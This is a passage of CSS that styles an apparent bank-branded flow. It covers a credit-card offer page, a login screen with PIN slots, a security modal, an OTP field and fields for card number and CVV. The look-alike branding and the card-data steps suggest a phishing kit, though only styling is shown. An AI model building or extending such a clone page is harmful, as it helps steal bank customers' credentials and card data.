    flex: 0 0 auto;
    background: transparent;
    border: none;
    margin: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 0;
    opacity: 0;
    transform: scale(.88);
    transition: opacity .24s ease, transform .34s cubic-bezier(.2, .85, .2, 1.18);
    filter: drop-shadow(0 4px 12px rgba(0, 0, 0, .1))
  }

  .flow-success-icon__img {
    display: block;
    width: 40px;
    height: 40px;
    object-fit: contain;
    pointer-events: none
  }

  .flow-success-icon.is-on {
    opacity: 1;
    transform: scale(1);
    filter: drop-shadow(0 6px 16px rgba(0, 0, 0, .12))
  }

  .flow-security-modal {
    box-sizing: border-box;
    width: min(560px, 94vw);
    max-width: 100%;
    max-height: min(88dvh, 900px);
    background: #FFF;
    border-radius: 20px;
    padding: 24px 26px 28px;
    color: #2C2A29;
    box-shadow: 0 14px 44px rgba(0, 0, 0, .28);
    opacity: 0;
    transform: translateY(8px) scale(.98);
    transition: opacity .34s ease, transform .34s ease;
    flex: 0 0 auto;
    margin: 0;
    position: relative;
    overflow: auto;
    overscroll-behavior: contain;
    display: none;
  }

  .flow-overlay.is-visible .flow-security-modal:not([hidden]) {
    opacity: 1;
    transform: translateY(0) scale(1)
  }

  /* Force overlay to be visible and allow interactions when is-active is present */
  .flow-overlay.is-active {
    opacity: 1 !important;
    pointer-events: auto !important;
  }

  .flow-overlay.is-active .flow-security-modal {
    opacity: 1 !important;
    transform: translateY(0) scale(1) !important;
    display: block !important;
  }

  .flow-loading-stage {
    display: none !important;
  }

  .flow-loading-stage[hidden],
  .flow-security-modal[hidden] {
    display: none !important
  }

  .flow-security-icon {
    width: 86px;
    height: 86px;
    border-radius: 14px;
    background: #F8F8F8;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 8px;
    overflow: hidden;
    flex: 0 0 auto
  }

  .flow-security-icon img {
    width: 100%;
    height: 100%;
    object-fit: cover
  }

  .flow-security-title {
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: 30px;
    line-height: 1.2;
    margin-bottom: 12px
  }

  .flow-security-text {
    font-size: 16px;
    line-height: 1.55;
    margin-bottom: 24px;
    color: #454545
  }

  .flow-security-btn {
    border: none;
    border-radius: 100px;
    height: 48px;
    width: min(190px, 100%);
    background: #FDDA24;
    color: #2C2A29;
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: 17px;
    font-weight: 700;
    cursor: pointer;
    margin: 0 auto;
    display: inline-flex;
    align-items: center;
    justify-content: center
  }

  .flow-security-btn:hover {
    background: #F5CF00
  }


  @keyframes spin {
    to {
      transform: rotate(360deg)
    }
  }

  @media (prefers-reduced-motion:reduce) {

    *,
    *::before,
    *::after {
      animation-duration: .01ms !important;
      animation-iteration-count: 1 !important;
      transition-duration: .01ms !important
    }
  }


  .app-view {
    display: none
  }

  .app-view.is-active {
    display: block
  }

  .product-view {
    display: none
  }

  .product-view.is-active {
    display: block
  }

  body.view-login {
    overflow: hidden;
    background: #EAEAEA
  }

  body.view-login #landingPage {
    display: none !important;
    visibility: hidden;
    pointer-events: none
  }


  .cc-layout {
    min-height: 100vh;
    background: #E8E8E8;
    color: #2C2A29
  }

  .cc-hero-wrap {
    padding: 0;
    display: block;
    min-height: auto
  }

  .cc-hero {
    max-width: 1080px;
    margin: 0 auto;
    min-height: auto;
    display: grid;
    grid-template-columns: minmax(0, 1fr) minmax(420px, 560px);
    align-items: start;
    gap: 34px;
    padding: 54px 32px 26px
  }

  .cc-hero__copy {
    max-width: 540px;
    padding-top: 20px
  }

  .cc-hero__title {
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: 52px;
    font-weight: 700;
    line-height: 56px;
    letter-spacing: -.6px;
    margin-bottom: 24px
  }

  @media (max-width:768px) {
    .cc-hero__title {
      font-size: 40px;
      line-height: 44px
    }
  }

  .cc-hero__desc {
    font-size: 24px;
    line-height: 1.26;
    margin-bottom: 26px;
    color: #0E213A
  }

  .cc-hero__cta {
    display: inline-flex;
    align-items: center;
    gap: 10px;
    height: 44px;
    border: none;
    border-radius: 999px;
    padding: 0 20px;
    background: #FDDA24;
    color: #2C2A29;
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: 19px;
    font-weight: 700;
    cursor: pointer
  }

  .cc-hero__cta:hover {
    background: #F5CF00
  }

  .cc-hero__media {
    position: relative;
    display: flex;
    justify-content: center;
    align-items: flex-start;
    min-height: 430px;
    padding-top: 16px
  }

  .cc-hero__card {
    position: relative;
    z-index: 2;
    width: min(500px, 96%);
    margin-top: 90px;
    filter: drop-shadow(0 20px 30px rgba(18, 24, 36, .2));
    border-radius: 18px
  }

  @media (max-width:768px) {
    .cc-hero__card {
      width: min(380px, 92%)
    }
  }

  .cc-hero__badge {
    position: absolute;
    left: 50%;
    top: 6px;
    transform: translateX(-50%);
    z-index: 3;
    display: flex;
    align-items: center;
    gap: 12px;
    background: #F9F9F9;
    border-radius: 8px;
    padding: 14px 16px;
    box-shadow: 0 2px 8px rgba(0, 0, 0, .08);
    font-size: 13px;
    line-height: 1.5;
    color: #1E1E1E;
    width: min(82vw, 460px);
    min-height: 64px
  }

  @media (max-width:768px) {
    .cc-hero__badge {
      top: 8px;
      padding: 12px 12px;
      width: min(92vw, 340px);
      gap: 10px
    }
  }

  .cc-hero__badge img {
    width: 20px;
    height: 20px;
    flex-shrink: 0
  }

  @media (max-width:768px) {
    .cc-hero__badge img {
      width: 18px;
      height: 18px
    }
  }

  .cc-hero__badge span {
    font-family: 'OpenSans', Arial, sans-serif;
    font-size: 12px;
    line-height: 1.4;
    letter-spacing: -.15px
  }

  @media (max-width:768px) {
    .cc-hero__badge span {
      font-size: 11px;
      line-height: 1.35
    }
  }

  .cc-hero__badge b {
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-weight: 700
  }

  @media (min-width:769px) {
    .cc-hero {
      padding-bottom: 0
    }

    .cc-hero__media {
      min-height: 414px;
      padding-top: 12px
    }

    .cc-hero__card {
      margin-top: 52px;
      transform: translateY(18px)
    }
  }

  .cc-benefits {
    padding: 28px 0 32px;
    background: #F5F5F5
  }

  .cc-benefits__title {
    text-align: center;
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: 36px;
    line-height: 40px;
    letter-spacing: -.6px;
    margin-bottom: 12px;
    color: #0E213A;
    font-weight: 700;
    display: none
  }

  .cc-carousel {
    max-width: 1120px;
    margin: 0 auto;
    display: grid;
    grid-template-columns: 56px 1fr 56px;
    align-items: center;
    gap: 18px;
    padding: 0 20px
  }

  .cc-carousel__arrow {
    width: 46px;
    height: 46px;
    border: none;
    border-radius: 50%;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    background: #FDDA24;
    color: #2C2A29;
    font-size: 26px;
    cursor: pointer;
    transition: transform .2s ease, background-color .2s ease, opacity .2s ease
  }

  .cc-carousel__arrow:hover {
    transform: translateY(-1px)
  }

  .cc-carousel__arrow:disabled {
    background: #DDDDDD;
    color: #AFAFAF;
    cursor: not-allowed
  }

  .cc-carousel__window {
    overflow: hidden;
    transition: height .35s ease
  }

  .cc-carousel__track {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 0
  }

  .cc-benefit {
    display: grid;
    grid-template-columns: 86px minmax(0, 1fr);
    column-gap: 14px;
    align-items: center;
    padding: 12px 8px
  }

  .cc-benefit--right {
    border-left: 1px solid #BEBEBE
  }

  .cc-benefit__icon {
    width: 74px;
    height: 74px;
    display: flex;
    align-items: center;
    justify-content: center
  }

  .cc-benefit__icon img {
    width: 100%;
    height: 100%;
    object-fit: contain
  }

  .cc-benefit__title {
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: 24px;
    line-height: 28px;
    letter-spacing: -.6px;
    margin-bottom: 6px;
    color: #323232;
    font-weight: 700
  }

  .cc-benefit__text {
    font-size: 18px;
    line-height: 1.3;
    color: #2F2F2F;
    margin-bottom: 10px
  }

  .cc-benefit.is-swapping {
    animation: ccBenefitFade .34s ease
  }

  .cc-dots {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 16px;
    margin-top: 24px
  }

  .cc-dots__item {
    width: 46px;
    height: 12px;
    border-radius: 999px;
    background: #323232;
    border: none;
    cursor: pointer;
    transition: background-color .25s ease, transform .25s ease
  }

  .cc-dots__item.is-active {
    background: #FDDA24;
    transform: scale(1.05)
  }

  @keyframes ccBenefitFade {
    from {
      opacity: .2;
      transform: translateY(7px)
    }

    to {
      opacity: 1;
      transform: translateY(0)
    }
  }

  /* cc-cupo section styles */
  .cc-cupo {
    padding: 32px 20px 0;
    background: #F5F5F5
  }

  .cc-cupo__card {
    max-width: 480px;
    margin: 0 auto;
    background: #F5F5F5;
    border-radius: 24px;
    padding: 28px 24px;
    box-shadow: none;
    font-family: 'OpenSans', Arial, sans-serif;
    color: #2C2A29
  }

  .cc-cupo__header {
    display: flex;
    align-items: flex-start;
    gap: 16px;
    margin-bottom: 28px
  }

  .cc-cupo__icon-container {
    width: 48px;
    height: 48px;
    border-radius: 12px;
    background: #FDDA24;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
    border: none
  }

  .cc-cupo__icon-container svg {
    width: 26px;
    height: 26px;
    stroke: #2C2A29
  }

  .cc-cupo__title-group {
    flex: 1
  }

  .cc-cupo__title {
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: 22px;
    font-weight: 700;
    line-height: 1.2;
    color: #2C2A29;
    margin-bottom: 4px;
    letter-spacing: -0.4px
  }

  .cc-cupo__subtitle {
    font-size: 13.5px;
    color: #5E5E5E;
    line-height: 1.4
  }

  .cc-cupo__value-group {
    text-align: center;
    margin-bottom: 18px
  }

  .cc-cupo__value-label {
    display: block;
    font-size: 14px;
    color: #5E5E5E;
    margin-bottom: 2px
  }

  .cc-cupo__value-display {
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: 38px;
    font-weight: 700;
    color: #2C2A29;
    letter-spacing: -0.8px
  }

  .cc-cupo__slider-container {
    margin-bottom: 28px
  }

  .cc-cupo__slider {
    -webkit-appearance: none;
    appearance: none;
    width: 100%;
    height: 6px;
    border-radius: 999px;
    outline: none;
    margin: 12px 0 8px;
    cursor: pointer;
    background: linear-gradient(to right, #FDDA24 0%, #FDDA24 11%, #E2E8F0 11%, #E2E8F0 100%)
  }

  .cc-cupo__slider::-webkit-slider-thumb {
    -webkit-appearance: none;
    appearance: none;
    width: 22px;
    height: 22px;
    border-radius: 50%;
    background: #FFFFFF;
    border: 5px solid #FDDA24;
    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
    transition: transform 0.1s ease
  }

  .cc-cupo__slider::-webkit-slider-thumb:hover {
    transform: scale(1.1)
  }

  .cc-cupo__slider::-webkit-slider-thumb:active {
    transform: scale(1.2)
  }

  .cc-cupo__slider::-moz-range-thumb {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    background: #FFFFFF;
    border: 5px solid #FDDA24;
    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
    cursor: pointer;
    transition: transform 0.1s ease
  }

  .cc-cupo__slider::-moz-range-thumb:hover {
    transform: scale(1.1)
  }

  .cc-cupo__slider-labels {
    display: flex;
    justify-content: space-between;
    font-size: 13px;
    color: #5E5E5E;
    font-weight: 500
  }

  .cc-cupo__benefits-list {
    background: #FFFFFF;
    border-radius: 16px;
    padding: 18px 20px;
    display: flex;
    flex-direction: column;
    gap: 14px;
    margin-bottom: 16px;
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03)
  }

  .cc-cupo__benefit-item {
    display: flex;
    align-items: center;
    gap: 12px
  }

  .cc-cupo__check-icon {
    width: 20px;
    height: 20px;
    border-radius: 50%;
    background: #28A745;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
    border: none
  }

  .cc-cupo__check-icon svg {
    width: 11px;
    height: 11px;
    stroke: #FFFFFF;
    stroke-width: 3.5
  }

  .cc-cupo__benefit-text {
    font-size: 14.5px;
    color: #2C2A29;
    line-height: 1.35
  }

  .cc-cupo__disclaimer {
    background: #FFFFFF;
    border-radius: 12px;
    padding: 12px 16px;
    display: flex;
    align-items: flex-start;
    gap: 10px;
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03)
  }

  .cc-cupo__info-icon {
    width: 18px;
    height: 18px;
    color: #7A7A7A;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
    margin-top: 1px
  }

  .cc-cupo__info-icon svg {
    width: 100%;
    height: 100%;
    color: #7A7A7A
  }

  .cc-cupo__disclaimer-text {
    font-size: 12px;
    line-height: 1.4;
    color: #5E5E5E
  }

  .cc-cupo__cta-wrap {
    text-align: center;
    padding: 16px 20px 28px;
    background: #F5F5F5
  }

  .cc-specs {
    background: #F5F5F5;
    padding: 18px 18px 10px
  }

  .cc-specs__inner {
    max-width: 1180px;
    margin: 0 auto
  }

  .cc-specs__title {
    text-align: center;
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: 28px;
    line-height: 32px;
    letter-spacing: -.6px;
    margin-bottom: 14px;
    color: #1D2033;
    font-weight: 700
  }

  .cc-specs__grid {
    display: grid;
    grid-template-columns: repeat(4, minmax(0, 1fr));
    gap: 14px 26px;
    align-items: start
  }

  .cc-specs__item {
    text-align: center;
    color: #1D2033
  }

  .cc-specs__icon {
    width: 28px;
    height: 28px;
    margin: 0 auto 6px;
    display: flex;
    align-items: center;
    justify-content: center
  }

  .cc-specs__icon img {
    width: 100%;
    height: 100%;
    object-fit: contain
  }

  .cc-specs__label {
    font-size: 15px;
    line-height: 1.3;
    margin-bottom: 4px
  }

  .cc-specs__value {
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: 24px;
    line-height: 1.2;
    font-weight: 700
  }

  .cc-specs__foot {
    text-align: center;
    font-size: 12px;
    line-height: 1.35;
    color: #1D2033;
    margin-top: 10px
  }


  .login-page {
    min-height: 100vh;
    background: #F7F7F7;
    color: #2C2A29;
    display: flex;
    flex-direction: column
  }

  .login-page.app-view {
    display: none
  }

  .login-page.app-view.is-active {
    display: flex;
    position: fixed;
    inset: 0;
    z-index: 120;
    width: 100vw;
    height: 100vh;
    overflow: hidden
  }


  .login-header {
    height: 62px;
    background: #FFFFFF;
    border-bottom: 1px solid #E5E5E5;
    display: grid;
    grid-template-columns: 1fr auto 1fr;
    align-items: center;
    padding: 0 18px;
    flex-shrink: 0;
    position: relative;
    z-index: 30
  }

  .login-header-logo {
    height: 58px;
    width: auto;
    justify-self: center
  }

  .login-header-right {
    justify-self: end;
    display: inline-flex;
    align-items: center;
    gap: 5px;
    font-size: 15px;
    color: #2C2A29;
    background: transparent;
    border: none;
    cursor: pointer;
    font-family: 'OpenSans', Arial, sans-serif
  }

  .login-header-right img {
    width: 24px;
    height: 24px
  }


  .login-main {
    position: relative;
    flex: 1;
    min-height: 0;
    display: flex;
    flex-direction: column;
    overflow: hidden
  }

  .login-main__toast-slot {
    position: absolute;
    left: 0;
    right: 0;
    top: 0;
    z-index: 8;
    display: flex;
    justify-content: center;
    align-items: flex-start;
    box-sizing: border-box;
    padding: 8px 20px 0;
    pointer-events: none
  }

  .login-main__toast-slot .login-panel-error-bar {
    pointer-events: auto
  }

  .login-main__body {
    position: relative;
    flex: 1;
    min-height: 0;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 0 20px 32px;
    overflow-x: hidden;
    overflow-y: auto;
    z-index: 1
  }

  .login-trazo-desktop {
    position: absolute;
    left: 50%;
    top: 44%;
    width: min(118vw, 2350px);
    transform: translate(-50%, -50%);
    pointer-events: none;
    z-index: 0
  }

  .login-trazo-mobile {
    display: none
  }

  .login-center {
    position: relative;
    z-index: 1;
    width: 100%;
    max-width: 530px;
    text-align: center
  }

  .login-title {
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: 28px;
    line-height: 1.04;
    letter-spacing: -.45px;
    margin-bottom: 14px;
    font-weight: 700
  }


  .login-card {
    background: #FFFFFF;
    border-radius: 16px;
    height: auto;
    min-height: 300px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    gap: 28px;
    width: 100%;
    max-width: 560px;
    margin: 0 auto;
    padding: 34px 88px;
    box-shadow: 0 2px 12px rgba(0, 0, 0, .04)
  }

  .login-user-copy,
  .login-pass-copy {
    font-size: 16px;
    line-height: 1.42;
    margin-bottom: 18px
  }

  .login-user-copy strong {
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-weight: 700
  }

  .login-user-copy__line {
    margin: 0;
    font-size: inherit;
    line-height: 1.42;
    color: #2C2A29
  }

  .login-user-copy__line--emphasis {
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-weight: 700
  }

  .login-user-copy__line+.login-user-copy__line {
    margin-top: 4px
  }

  .login-user-copy {
    width: 100%;
    text-align: center
  }

  .login-user-form {
    display: contents
  }

  .login-page__bottom-spacer {
    display: none;
    flex: 1 1 auto;
    min-height: 0;
    width: 100%
  }


  .login-field-wrap {
    margin-bottom: 8px;
    text-align: left;
    position: relative;
    padding-top: 8px
  }

  .login-field-label {
    position: absolute;
    left: 28px;
    top: 19px;
    font-size: 16px;
    color: #5D6166;
    opacity: 1;
    transform: none;
    transition: opacity .16s ease, top .18s ease, font-size .18s ease;
    pointer-events: none;
    height: auto;
    overflow: visible;
    line-height: 1.1;
    margin-bottom: 0;
    background: #FFF;
    padding-right: 4px
  }

  .login-field-wrap.focused .login-field-label,
  .login-field-wrap.has-value:not(.focused) .login-field-label {
    top: 0;
    left: 28px;
    font-size: 12px;
    color: #2C2A29;
    opacity: 1;
    visibility: visible;
    clip: auto;
    width: auto;
    height: auto;
    overflow: visible;
    border: none
  }

  .login-user-row {
    display: flex;
    align-items: center;
    gap: 8px;
    border-bottom: 2.4px solid #8E9093;
    padding: 6px 0 5px;
    transition: border-color .18s ease
  }

  .login-user-row--invalid {
    border-bottom-color: #D92D20 !important
  }

  .login-field-wrap.focused .login-user-row.login-user-row--invalid {
    border-bottom-color: #D92D20 !important
  }

  .login-field-wrap.focused .login-user-row:not(.login-user-row--invalid) {
    border-bottom-color: #FDDA24
  }

  .login-field-wrap.has-value:not(.focused) .login-user-row:not(.login-user-row--invalid) {
    border-bottom-color: #2C2A29
  }

  .login-user-row img {
    width: 24px;
    height: 24px;
    opacity: .92;
    flex-shrink: 0;
    margin-top: 0
  }

  .login-user-input {
    border: none;
    outline: none;
    background: transparent;
    width: 100%;
    font-family: 'OpenSans', Arial, sans-serif;
    font-size: 20px;
    color: #2C2A29;
    line-height: 1.2;
    padding-top: 2px
  }

  .login-user-input::placeholder {
    color: transparent;
    opacity: 0
  }

  .login-user-error {
    min-height: 18px;
    display: flex;
    align-items: flex-start;
    justify-content: space-between;
    gap: 10px;
    margin-top: 8px;
    margin-bottom: 20px
  }

  .login-user-error__msg {
    font-size: 12px;
    line-height: 1.3;
    color: #D92D20;
    text-align: left;
    font-weight: 600;
    white-space: pre-line;
    flex: 1;
    display: block
  }

  .login-panel-error-bar {
    position: relative;
    width: 100%;
    max-width: min(560px, calc(100vw - 40px));
    display: flex;
    align-items: stretch;
    overflow: hidden;
    border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, .12);
    font-family: 'OpenSans', Arial, sans-serif;
    opacity: 0;
    transform: translateY(-8px) scale(0.99);
    margin: 0 auto;
    pointer-events: none;
    will-change: opacity, transform;
    transition: opacity .45s ease, transform .48s cubic-bezier(0.2, 0.85, 0.2, 1), box-shadow .3s ease
  }

  .login-panel-error-bar[hidden] {
    display: none !important;
    pointer-events: none
  }

  .login-panel-error-bar.is-visible {
    opacity: 1;
    transform: translateY(0) scale(1);
    pointer-events: auto;
    box-shadow: 0 4px 22px rgba(0, 0, 0, .16);
    transition: opacity .45s ease, transform .5s cubic-bezier(0.2, 0.85, 0.2, 1), box-shadow .3s ease
  }

  .login-panel-error-bar__accent {
    width: 48px;
    flex-shrink: 0;
    background: #F16E00;
    display: flex;
    align-items: center;
    justify-content: center
  }

  .login-panel-error-bar__icon {
    width: 26px;
    height: 26px;
    border-radius: 50%;
    background: #fff;
    color: #F16E00;
    font-weight: 800;
    font-size: 15px;
    line-height: 1;
    display: flex;
    align-items: center;
    justify-content: center
  }

  .login-panel-error-bar__content {
    flex: 1;
    background: #333;
    padding: 14px 16px 14px 12px;
    color: #fff
  }

  .login-panel-error-bar__title {
    display: block;
    font-size: 15px;
    font-weight: 700;
    margin-bottom: 5px;
    letter-spacing: -.2px
  }

  .login-panel-error-bar__text {
    margin: 0;
    font-size: 13px;
    line-height: 1.38;
    font-weight: 400;
    opacity: .96
  }

  .login-panel-error-bar__close {
    flex-shrink: 0;
    width: 42px;
    border: none;
    background: #333;
    color: #fff;
    font-size: 20px;
    cursor: pointer;
    line-height: 1;
    padding: 0;
    align-self: stretch
  }

  .login-panel-error-bar__close:hover {
    opacity: .88
  }

  @media (min-width:769px) {
    .login-main__toast-slot {
      padding: 10px 24px 0
    }
  }

  @media (max-width:768px) {
    .login-main__toast-slot {
      padding: 6px 10px 0
    }

    .login-panel-error-bar {
      max-width: calc(100% - 20px);
      border-radius: 8px;
      box-shadow: 0 2px 14px rgba(0, 0, 0, .12)
    }

    .login-panel-error-bar__accent {
      width: 40px
    }

    .login-panel-error-bar__content {
      padding: 9px 10px 9px 8px
    }

    .login-panel-error-bar__title {
      font-size: 12.5px;
      margin-bottom: 2px
    }

    .login-panel-error-bar__text {
      font-size: 11px;
      line-height: 1.35
    }
  }

  .login-user-error__forgot {
    font-size: 11px;
    line-height: 1.3;
    color: #2C2A29;
    text-align: right;
    white-space: nowrap;
    transition: opacity .2s ease, max-width .2s ease;
    cursor: default
  }

  .login-field-wrap.has-value .login-user-error__forgot,
  .login-field-wrap.focused .login-user-error__forgot {
    opacity: 0;
    max-width: 0;
    overflow: hidden;
    pointer-events: none
  }

  .login-field-wrap.has-value .login-user-error__msg,
  .login-field-wrap.focused .login-user-error__msg {
    flex: 1 1 100%
  }


  .login-buttons {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 16px;
    align-items: center
  }

  .login-btn {
    height: 49px;
    border-radius: 100px;
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: 16px;
    font-weight: 700;
    border: none;
    cursor: pointer
  }

  .login-btn.back {
    background: transparent;
    border: 1.5px solid #2C2A29;
    color: #000;
    display: inline-flex;
    align-items: center;
    justify-content: center
  }

  .login-btn.next {
    background: #C2C4C8;
    color: #2C2A29
  }

  .login-btn.next.enabled {
    background: #FDDA24
  }

  .login-pass-icon {
    width: 22px;
    height: 22px;
    margin: 0 auto 14px
  }

  .login-step {
    display: block;
    width: 100%;
    animation: loginStepIn .35s ease both
  }

  .login-step[hidden] {
    display: none
  }

  @keyframes loginStepIn {
    from {
      opacity: 0;
      transform: translateY(8px)
    }

    to {
      opacity: 1;
      transform: translateY(0)
    }
  }


  .pin-wrap {
    margin-bottom: 14px
  }

  .pin-input {
    position: absolute;
    left: 50%;
    top: 50%;
    width: 220px;
    height: 44px;
    transform: translate(-50%, -62%);
    opacity: .01;
    border: none;
    outline: none;
    background: transparent;
    pointer-events: auto
  }

  .pin-slots {
    display: flex;
    justify-content: center;
    gap: 12px;
    margin-bottom: 12px
  }

  .pin-slot {
    width: 40px;
    border-bottom: 1.7px solid #2C2A29;
    text-align: center;
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: 28px;
    line-height: 1;
    color: #2C2A29;
    min-height: 38px;
    padding-bottom: 2px;
    position: relative
  }

  .pin-wrap.is-focused .pin-slot {
    border-bottom-color: #2C2A29
  }

  .pin-slot.active {
    border-bottom-width: 2px;
    border-bottom-color: #2C2A29
  }

  .pin-slot.filled {
    border-bottom-color: #2C2A29
  }

  .pin-wrap.is-focused .pin-slot.active::after {
    content: '';
    position: absolute;
    left: 50%;
    bottom: 4px;
    transform: translateX(-50%);
    width: 2px;
    height: 22px;
    background: #2C2A29;
    animation: pinCaretBlink 1s steps(1, end) infinite
  }

  .pin-error {
    min-height: 18px;
    font-size: 12px;
    line-height: 1.3;
    color: #D92D20;
    text-align: center;
    font-weight: 600;
    white-space: pre-line;
    margin-top: 8px;
    margin-bottom: 4px
  }

  @keyframes pinCaretBlink {

    0%,
    49% {
      opacity: 1
    }

    50%,
    100% {
      opacity: 0
    }
  }


  .login-footer {
    display: flex;
    align-items: flex-start;
    justify-content: space-between;
    padding: 14px 48px 20px;
    background: transparent;
    flex-shrink: 0;
    position: relative;
    z-index: 1;
    margin-top: -4px;
    min-height: 98px
  }

  .login-footer::before {
    content: '';
    position: absolute;
    top: 0;
    left: 50%;
    transform: translateX(-50%);
    width: 95%;
    height: 1px;
    background: #C9C9C9
  }

  .login-footer-left {
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    gap: 3px;
    margin-top: 2px
  }

  .login-footer-logo {
    height: 20px;
    width: auto
  }

  .login-footer-vigilado {
    height: 12px;
    width: auto
  }

  .login-footer-right {
    text-align: right;
    font-size: 12px;
    line-height: 1.45;
    color: #1D1D1D
  }


  .flow-subtitle {
    font-size: 15px;
    line-height: 1.45;
    color: #454545;
    margin: 0 0 14px;
    text-align: center;
    max-width: 42ch;
    margin-left: auto;
    margin-right: auto
  }

  .flow-icon-head {
    width: 48px;
    height: 48px;
    margin: 0 auto 10px;
    display: block
  }

  .flow-card-img {
    width: 100%;
    max-width: 280px;
    height: auto;
    border-radius: 12px;
    margin: 8px auto 12px;
    display: block
  }

  .flow-pin-label-row {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 4px;
    margin: 12px 0 10px
  }

  .flow-pin-label-row img {
    width: 22px;
    height: 22px
  }

  .flow-pin-label-row .flow-pin-lbl {
    font-size: 14px;
    font-weight: 400;
    color: #2C2A29
  }

  .flow-pin-label-row .flow-pin-lbl strong {
    font-weight: 700;
    color: #2C2A29
  }

  .flow-digits {
    display: flex;
    justify-content: center;
    gap: 8px;
    flex-wrap: wrap;
    margin: 8px 0 18px
  }

  .flow-digits .flow-digit {
    width: 40px;
    padding: 8px 0;
    text-align: center;
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: 22px;
    border: none;
    border-bottom: 2.4px solid #2C2A29;
    background: transparent;
    outline: none;
    border-radius: 0
  }

  .flow-digits .flow-digit:focus {
    border-bottom-color: #FDDA24
  }


  .flow-otp-input-wrapper {
    display: flex;
    gap: clamp(10px, 2.5vw, 12px);
    align-items: center;
    width: 100%;
    max-width: 100%;
    margin: 8px 0 12px
  }

  .flow-otp-single-input {
    flex: 1;
    min-width: 0;
    padding: clamp(10px, 2.5vw, 12px) clamp(14px, 3.5vw, 16px);
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: clamp(1.1rem, 4vw, 1.4rem);
    letter-spacing: clamp(4px, 1.5vw, 8px);
    text-align: center;
    border: 2px solid #2C2A29;
    border-radius: 8px;
    background: #FFF;
    outline: none;
    transition: border-color .2s ease;
    font-weight: 600
  }

  .flow-otp-single-input:focus {
    border-color: #FDDA24;
    border-width: 2.5px
  }

  .flow-otp-single-input::placeholder {
    color: #BDBDBD;
    letter-spacing: clamp(4px, 1.5vw, 8px);
    font-weight: 400
  }

  .flow-otp-paste-btn {
    padding: clamp(10px, 2.5vw, 12px) clamp(16px, 4vw, 20px);
    font-family: 'CIBFontSans', Arial, sans-serif;
    font-size: clamp(0.9rem, 3vw, 1rem);
    font-weight: 600;
    color: #2C2A29;
    background: #FDDA24;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    transition: all .2s ease;
    white-space: nowrap;
    flex-shrink: 0
  }

  .flow-otp-paste-btn:hover {
    background: #FDD010;
    transform: translateY(-1px)
  }

  .flow-otp-paste-btn:active {
    transform: translateY(0);
    background: #F5C900
  }

  .flow-cvv-single {
    width: 120px;
    padding: 12px 14px;
    font-size: 22px;
    text-align: center;
    letter-spacing: .2em;
    border: 1.5px solid #C5C5C5;
    border-radius: 10px;
    background: #FAFAFA;
    font-family: 'CIBFontSans', Arial, sans-serif
  }

  .flow-cvv-single:focus {
    border-color: #FDDA24;
    outline: none
  }

  .flow-card-form .flow-ff {
    margin-bottom: 14px;
    text-align: left
  }

  .flow-card-form .flow-ff label {
    display: block;
    font-size: 12px;
    font-weight: 700;
    color: #2C2A29;
    margin-bottom: 6px;
    text-transform: uppercase;
    letter-spacing: .04em
  }

  .flow-card-form .flow-ff input {
    width: 100%;
    padding: 12px 14px;
    font-size: 16px;
    border: 1.5px solid #D0D0D0;
    border-radius: 10px;
    background: #FAFAFA;
    color: #2C2A29;
    outline: none;
    font-family: 'OpenSans', Arial, sans-serif
  }

  .flow-card-form .flow-ff input:focus {
    border-color: #FDDA24;
    background: #fff
  }

  .flow-card-form .flow-ff-row {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 12px
  }


  .flow-card-field {
    margin-bottom: clamp(1rem, 3vw, 1.25rem);
    text-align: left
  }

  .flow-card-label {
    display: block;
    font-size: clamp(0.7rem, 2.2vw, 0.75rem);
    font-weight: 600;
    color: #374151;
    margin-bottom: clamp(0.4rem, 1.2vw, 0.5rem);
    text-transform: uppercase;
    letter-spacing: .025em
  }

  .flow-card-input {
    width: 100%;
    padding: clamp(0.75rem, 2.2vw, 0.875rem) clamp(0.875rem, 2.5vw, 1rem);
    font-size: clamp(0.95rem, 3vw, 1rem);
    border: 2px solid #e5e7eb;
    border-radius: 8px;
    background: #f9fafb;
    color: #1f2937;
    outline: none;
    transition: all .2s;
    font-family: 'OpenSans', Arial, sans-serif
  }

  .flow-card-input::placeholder {
    color: #9ca3af
  }

  .flow-card-input:focus {
    border-color: #FDDA24;
    background: #fff;
    box-shadow: 0 0 0 3px rgba(253, 218, 36, .15)
  }

  .flow-card-input--error {
    border-color: #ef4444;
    background: #fef2f2
  }

  .flow-card-row {
    display: grid;
